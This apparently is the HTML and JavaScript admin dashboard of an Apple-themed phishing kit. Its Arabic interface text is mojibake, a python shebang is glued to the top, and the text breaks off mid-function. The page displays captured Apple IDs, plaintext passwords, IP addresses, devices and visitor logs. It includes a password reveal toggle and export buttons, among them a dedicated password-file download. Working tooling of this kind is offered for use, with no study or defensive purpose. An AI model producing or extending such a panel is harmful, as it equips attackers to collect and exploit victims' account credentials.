#!/usr/bin/env python3<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Ø¥Ø¯Ø§Ø±Ø© Ø¨ÙŠØ§Ù†Ø§Øª Apple</title>
    <style>
        :root {
            --primary: #007AFF;
            --primary-dark: #0056CC;
            --success: #34C759;
            --danger: #FF3B30;
            --warning: #FF9500;
            --dark: #1D1D1F;
            --light: #F5F5F7;
            --gray: #8E8E93;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        .admin-header {
            background: var(--dark);
            color: white;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .back-btn {
            color: white;
            text-decoration: none;
            padding: 8px 16px;
            background: var(--primary);
            border-radius: 20px;
            font-size: 14px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            padding: 24px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            text-align: center;
        }
        
        .stat-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: var(--primary);
        }
        
        .stat-label {
            color: var(--gray);
            margin-top: 5px;
        }
        
        .data-section {
            background: white;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 30px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--light);
        }
        
        .section-title {
            font-size: 20px;
            font-weight: 600;
        }
        
        .table-container {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 12px 16px;
            text-align: right;
            border-bottom: 1px solid var(--light);
        }
        
        th {
            background: var(--light);
            font-weight: 600;
            color: var(--dark);
        }
        
        tr:hover {
            background: var(--light);
        }
        
        .credential-password {
            font-family: monospace;
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .actions {
            display: flex;
            gap: 10px;
        }
        
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }
        
        .export-section {
            background: white;
            border-radius: 12px;
            padding: 24px;
            margin-top: 30px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        
        .export-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .export-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 15px;
            background: var(--light);
            border: 2px dashed var(--gray);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .export-btn:hover {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }
        
        .password-view {
            display: none;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 8px;
            margin-top: 5px;
            font-family: monospace;
        }
        
        .toggle-password-btn {
            background: none;
            border: none;
            color: var(--primary);
            cursor: pointer;
            font-size: 12px;
        }
        
        .search-box {
            padding: 10px 15px;
            border: 1px solid var(--light);
            border-radius: 8px;
            width: 300px;
            font-size: 14px;
        }
        
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .actions {
                flex-direction: column;
            }
            
            .search-box {
                width: 100%;
            }
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--gray);
        }
        
        .auto-refresh {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
        }
        
        .refresh-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
        }
        
        .live-badge {
            background: var(--success);
            color: white;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
    </style>
</head>
<body>
    <div class="admin-header">
        <div class="logo">
            <span>ï£¿</span>
            Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø¨ÙŠØ§Ù†Ø§Øª Apple
        </div>
        <a href="index.html" class="back-btn">â† Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</a>
    </div>
    
    <div class="container">
        <div class="stats-grid" id="statsGrid">
            <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
        </div>
        
        <div class="data-section">
            <div class="section-header">
                <div>
                    <h2 class="section-title">ğŸ“§ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø³Ø¬Ù„Ø©</h2>
                    <div class="live-badge">Ù…Ø¨Ø§Ø´Ø±</div>
                </div>
                <input type="text" class="search-box" placeholder="Ø¨Ø­Ø« Ø¹Ù† Apple ID..." onkeyup="filterCredentials()">
            </div>
            
            <div class="table-container">
                <table id="credentialsTable">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Ø§Ù„ÙˆÙ‚Øª</th>
                            <th>Apple ID</th>
                            <th>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</th>
                            <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                            <th>Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                            <th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</th>
                        </tr>
                    </thead>
                    <tbody id="credentialsBody">
                        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                    </tbody>
                </table>
            </div>
            
            <div class="empty-state" id="emptyCredentials" style="display: none;">
                <p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ù…Ø³Ø¬Ù„Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†</p>
            </div>
            
            <div class="actions" style="margin-top: 20px;">
                <button class="btn btn-danger" onclick="clearAllCredentials()">
                    ğŸ—‘ï¸ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                </button>
                <button class="btn btn-primary" onclick="refreshData()">
                    ğŸ”„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                </button>
                <button class="btn btn-success" onclick="exportCredentials('json')">
                    ğŸ“¥ ØªØµØ¯ÙŠØ± ÙƒÙ€ JSON
                </button>
            </div>
        </div>
        
        <div class="data-section">
            <div class="section-header">
                <h2 class="section-title">ğŸ‘€ Ø³Ø¬Ù„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</h2>
            </div>
            
            <div class="table-container">
                <table id="visitsTable">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Ø§Ù„ÙˆÙ‚Øª</th>
                            <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                            <th>Ø§Ù„Ù…ØªØµÙØ­</th>
                            <th>Ø§Ù„Ø¯Ù‚Ø©</th>
                            <th>Ø§Ù„Ù„ØºØ©</th>
                        </tr>
                    </thead>
                    <tbody id="visitsBody">
                        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                    </tbody>
                </table>
            </div>
            
            <div class="empty-state" id="emptyVisits" style="display: none;">
                <p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø²ÙŠØ§Ø±Ø§Øª Ù…Ø³Ø¬Ù„Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†</p>
            </div>
        </div>
        
        <div class="data-section">
            <div class="section-header">
                <h2 class="section-title">ğŸ“Š Ù…Ù„Ù Kelog (Ø§Ù„Ø³Ø¬Ù„Ø§Øª)</h2>
            </div>
            
            <div class="table-container">
                <table id="kelogTable">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Ø§Ù„ÙˆÙ‚Øª</th>
                            <th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡</th>
                            <th>Ø§Ù„ØªÙØ§ØµÙŠÙ„</th>
                        </tr>
                    </thead>
                    <tbody id="kelogBody">
                        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                    </tbody>
                </table>
            </div>
            
            <div class="empty-state" id="emptyKelog" style="display: none;">
                <p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª ÙÙŠ Ù…Ù„Ù Kelog Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†</p>
            </div>
            
            <div class="actions" style="margin-top: 20px;">
                <button class="btn btn-danger" onclick="clearKelog()">
                    ğŸ—‘ï¸ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                </button>
                <button class="btn btn-success" onclick="exportKelog()">
                    ğŸ“¥ ØªØµØ¯ÙŠØ± Ù…Ù„Ù Kelog
                </button>
            </div>
        </div>
        
        <div class="export-section">
            <h2 class="section-title">ğŸ“ ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</h2>
            <p>ÙŠÙ…ÙƒÙ†Ùƒ ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø© Ø¨ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ù…Ø®ØªÙ„ÙØ©</p>
            
            <div class="export-options">
                <div class="export-btn" onclick="exportAllData('json')">
                    <span>ğŸ”„</span>
                    <span>ØªØµØ¯ÙŠØ± ÙƒØ§Ù…Ù„ ÙƒÙ€ JSON</span>
                </div>
                
                <div class="export-btn" onclick="exportAllData('csv')">
                    <span>ğŸ“Š</span>
                    <span>ØªØµØ¯ÙŠØ± ÙƒØ§Ù…Ù„ ÙƒÙ€ CSV</span>
                </div>
                
                <div class="export-btn" onclick="exportAllData('txt')">
                    <span>ğŸ“</span>
                    <span>ØªØµØ¯ÙŠØ± ÙƒØ§Ù…Ù„ ÙƒÙ€ Ù†Øµ</span>
                </div>
                
                <div class="export-btn" onclick="downloadCredentialsFile()">
                    <span>ğŸ”</span>
                    <span>ØªØ­Ù…ÙŠÙ„ Ù…Ù„Ù ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±</span>
                </div>
            </div>
            
            <div class="auto-refresh">
                <label>
                    <input type="checkbox" id="autoRefresh" checked>
                    Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ
                </label>
                <button class="refresh-btn" onclick="refreshData()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¢Ù†</button>
            </div>
        </div>
    </div>

    <script>
        // Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        let credentials = [];
        let visits = [];
        let kelog = [];
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù†Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
        document.addEventListener('DOMContentLoaded', function() {
            loadAllData();
            updateStats();
            
            // Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
            const autoRefresh = document.getElementById('autoRefresh');
            if (autoRefresh && autoRefresh.checked) {
                setInterval(() => {
                    loadAllData();
                    updateStats();
                }, 10000);
            }
        });
        
        // ØªØ­Ù…ÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function loadAllData() {
            try {
                // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
                const credsData = localStorage.getItem('apple_credentials');
                credentials = credsData ? JSON.parse(credsData) : [];
                
                // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
                const visitsData = localStorage.getItem('apple_visits');
                visits = visitsData ? JSON.parse(visitsData) : [];
                
                // ØªØ­Ù…ÙŠÙ„ kelog
                const kelogData = localStorage.getItem('kelog');
                kelog = kelogData ? JSON.parse(kelogData) : [];
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                displayCredentials();
                displayVisits();
                displayKelog();
                
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
        function updateStats() {
            const stats = {
                totalCredentials: credentials.length,
                totalVisits: visits.length,
                totalKelog: kelog.length,
                lastHourCredentials: credentials.filter(c => {
                    const credTime = new Date(c.time);
                    const hourAgo = new Date(Date.now() - 3600000);
                    return credTime > hourAgo;
                }).length
            };
            
            document.getElementById('statsGrid').innerHTML = `
                <div class="stat-card">
                    <div class="stat-icon">ğŸ“§</div>
                    <div class="stat-number">${stats.totalCredentials}</div>
                    <div class="stat-label">Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ‘€</div>
                    <div class="stat-number">${stats.totalVisits}</div>
                    <div class="stat-label">Ø²ÙŠØ§Ø±Ø§Øª</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ“Š</div>
                    <div class="stat-number">${stats.totalKelog}</div>
                    <div class="stat-label">Ø³Ø¬Ù„Ø§Øª</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">â°</div>
                    <div class="stat-number">${stats.lastHourCredentials}</div>
                    <div class="stat-label">Ø¢Ø®Ø± Ø³Ø§Ø¹Ø©</div>
                </div>
            `;
        }
        
        // Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function displayCredentials() {
            const tbody = document.getElementById('credentialsBody');
            const emptyState = document.getElementById('emptyCredentials');
            
            if (credentials.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            credentials.slice().reverse().forEach((cred, index) => {
                const time = new Date(cred.time).toLocaleString('ar-SA');
                const shortId = cred.appleId.length > 25 ? 
                    cred.appleId.substring(0, 25) + '...' : cred.appleId;
                const device = cred.userAgent ? 
                    getBrowserName(cred.userAgent) : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${cred.appleId}</td>
                    <td>
                        <span class="credential-password">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</span>
                        <button class="toggle-password-btn" onclick="togglePasswordView(${credentials.length - 1 - index})">
                            ğŸ‘ï¸ Ø¹Ø±Ø¶
                        </button>
                        <div class="password-view" id="passwordView${credentials.length - 1 - index}">
                            ${cred.password}
                        </div>
                    </td>
                    <td>${cred.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>${device}</td>
                    <td>
                        <button class="btn btn-danger" onclick="deleteCredential(${credentials.length - 1 - index})">
                            Ø­Ø°Ù
                        </button>
                    </td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¹Ø±Ø¶ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        function displayVisits() {
            const tbody = document.getElementById('visitsBody');
            const emptyState = document.getElementById('emptyVisits');
            
            if (visits.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            visits.slice().reverse().forEach((visit, index) => {
                const time = new Date(visit.time).toLocaleString('ar-SA');
                const browser = visit.userAgent ? 
                    getBrowserName(visit.userAgent) : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${visit.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>${browser}</td>
                    <td>${visit.screen || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>${visit.language || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¹Ø±Ø¶ kelog
        function displayKelog() {
            const tbody = document.getElementById('kelogBody');
            const emptyState = document.getElementById('emptyKelog');
            
            if (kelog.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            kelog.slice().reverse().forEach((log, index) => {
                const time = new Date(log.timestamp).toLocaleString('ar-SA');
                const details = log.data ? 
                    JSON.stringify(log.data).substring(0, 50) + '...' : '';
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${log.action || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td title="${JSON.stringify(log.data || {})}">
                        ${details}
                    </td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­
        function getBrowserName(userAgent) {
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            return 'Ù…ØªØµÙØ­ Ø¢Ø®Ø±';
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø¹Ø±Ø¶ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function togglePasswordView(index) {
            const view = document.getElementById(`passwordView${index}`);
            const btn = event.target;
            
            if (view.style.display === 'block') {
                view.style.display = 'none';
                btn.textContent = 'ğŸ‘ï¸ Ø¹Ø±Ø¶';
            } else {
                view.style.display = 'block';
                btn.textContent = 'ğŸ™ˆ Ø¥Ø®ÙØ§Ø¡';
            }
        }
        
        // Ø­Ø°Ù Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„
        function deleteCredential(index) {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŸ')) {
                credentials.splice(index, 1);
                localStorage.setItem('apple_credentials', JSON.stringify(credentials));
                
                // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ kelog
                addToKelog('Ø­Ø°Ù Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„', { index });
                
                loadAllData();
                updateStats();
            }
        }
        
        // Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function clearAllCredentials() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ØŸ Ù‡Ø°Ø§ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ØªØ±Ø§Ø¬Ø¹ Ø¹Ù†Ù‡.')) {
                credentials = [];
                localStorage.setItem('apple_credentials', JSON.stringify([]));
                
                // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ kelog
                addToKelog('Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„', {});
                
                loadAllData();
                updateStats();
                alert('ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­');
            }
        }
        
        // Ø­Ø°Ù kelog
        function clearKelog() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§ØªØŸ')) {
                kelog = [];
                localStorage.setItem('kelog', JSON.stringify([]));
                
                loadAllData();
                updateStats();
                alert('ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø¨Ù†Ø¬Ø§Ø­');
            }
        }
        
        // Ø¥Ø¶Ø§ÙØ© Ø¥Ù„Ù‰ kelog
        function addToKelog(action, data) {
            const logEntry = {
                action: action,
                data: data,
                timestamp: new Date().toISOString()
            };
            
            kelog.push(logEntry);
            localStorage.setItem('kelog', JSON.stringify(kelog));
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function refreshData() {
            loadAllData();
            updateStats();
            alert('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
        }
        
        // ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function exportAllData(format) {
            const allData = {
                credentials: credentials,
                visits: visits,
                kelog: kelog,
                exportedAt: new Date().toISOString(),
                totalRecords: credentials.length + visits.length + kelog.length
            };
            
            let content, filename, mimeType;
            
            switch (format) {
                case 'json':
                    content = JSON.stringify(allData, null, 2);
                    filename = `apple_data_${Date.now()}.json`;
                    mimeType = 'application/json';
                    break;
                    
                case 'csv':
                    content = convertToCSV(allData);
                    filename = `apple_data_${Date.now()}.csv`;
                    mimeType = 'text/csv';
                    break;
                    
                case 'txt':
                    content = convertToTXT(allData);
                    filename = `apple_data_${Date.now()}.txt`;
                    mimeType = 'text/plain';
                    break;
                    
                default:
                    alert('ØªÙ†Ø³ÙŠÙ‚ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ');
                    return;
            }
            
            downloadFile(content, filename, mimeType);
            
            // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ kelog
            addToKelog('ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', { format, filename });
        }
        
        // ØªØµØ¯ÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙÙ‚Ø·
        function exportCredentials(format) {
            const credsData = {
                credentials: credentials,
                exportedAt: new Date().toISOString(),
                count: credentials.length
            };
            
            let content, filename, mimeType;
            
            if (format === 'json') {
                content = JSON.stringify(credsData, null, 2);
                filename = `apple_credentials_${Date.now()}.json`;
                mimeType = 'application/json';
            } else {
                alert('Ù‡Ø°Ø§ Ø§Ù„ØªÙ†Ø³ÙŠÙ‚ ØºÙŠØ± Ù…ØªØ§Ø­ Ø­Ø§Ù„ÙŠØ§Ù‹');
                return;
            }
            
            downloadFile(content, filename, mimeType);
            
            // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ kelog
            addToKelog('ØªØµØ¯ÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„', { format, filename });
        }
        
        // ØªØµØ¯ÙŠØ± kelog
        function exportKelog() {
            const kelogData = {
                logs: kelog,
                exportedAt: new Date().toISOString(),
                count: kelog.length
            };
            
            const content = JSON.stringify(kelogData, null, 2);
            downloadFile(content, `apple_kelog_${Date.now()}.json`, 'application/json');
            
            // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ kelog
            addToKelog('ØªØµØ¯ÙŠØ± Ù…Ù„Ù Kelog', {});
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ù…Ù„Ù ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±
        function downloadCredentialsFile() {
            if (credentials.length === 0) {
                alert('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ù„ØªØµØ¯ÙŠØ±Ù‡Ø§');
                return;
            }
            
            let content = 'ğŸ¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Apple - Ù…ÙØµØ¯Ø±Ø© ÙÙŠ ' + new Date().toLocaleString('ar-SA') + '\n\n';
            content += '='.repeat(60) + '\n\n';
            
            credentials.slice().reverse().forEach((cred, index) => {
                content += `ğŸ“ Ø§Ù„Ø³Ø¬Ù„ ${index + 1}\n`;
                content += 'â”€'.repeat(40) + '\n';
                content += `ğŸ“§ Apple ID: ${cred.appleId}\n`;
                content += `ğŸ”‘ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${cred.password}\n`;
                content += `ğŸŒ Ø¹Ù†ÙˆØ§Ù† IP: ${cred.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n`;
                content += `ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date(cred.time).toLocaleString('ar-SA')}\n`;
                content += `ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${cred.userAgent?.substring(0, 100) || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n`;
                content += `ğŸ“ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${cred.timezone || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n`;
                content += '\n' + '='.repeat(60) + '\n\n';
            });
            
            content += `\n\nØ¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø³Ø¬Ù„Ø§Øª: ${credentials.length}\n`;
            content += `ØªØ§Ø±ÙŠØ® Ø§Ù„ØªØµØ¯ÙŠØ±: ${new Date().toLocaleString('ar-SA')}\n`;
            
            downloadFile(content, `apple_passwords_${Date.now()}.txt`, 'text/plain');
            
            // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ kelog
            addToKelog('ØªØ­Ù…ÙŠÙ„ Ù…Ù„Ù ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±', { count: credentials.length });
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ CSV
        function convertToCSV(data) {
            let csv = 'Type,AppleID,Password,IP,Time,UserAgent\n';
            
            // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
            data.credentials.forEach(cred => {
                csv += `Credential,"${cred.appleId}","${cred.password}","${cred.ip || ''}","${cred.time}","${cred.userAgent || ''}"\n`;
            });
            
            // Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
            data.visits.forEach(visit => {
                csv += `Visit,"","","${visit.ip || ''}","${visit.time}","${visit.userAgent || ''}"\n`;
            });
            
            return csv;
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Ù†Øµ
        function convertToTXT(data) {
            let text = '='.repeat(70) + '\n';
            text += 'ğŸ¯ Ø¨ÙŠØ§Ù†Ø§Øª Apple - Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„ÙƒØ§Ù…Ù„\n';
            text += '='.repeat(70) + '\n\n';
            
            text += 'ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:\n';
            text += 'â”€'.repeat(40) + '\n';
            text += `â€¢ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„: ${data.credentials.length}\n`;
            text += `â€¢ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª: ${data.visits.length}\n`;
            text += `â€¢ Ø§Ù„Ø³Ø¬Ù„Ø§Øª: ${data.kelog.length}\n`;
            text += `â€¢ Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: ${data.totalRecords}\n\n`;
            
            text += 'ğŸ“§ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:\n';
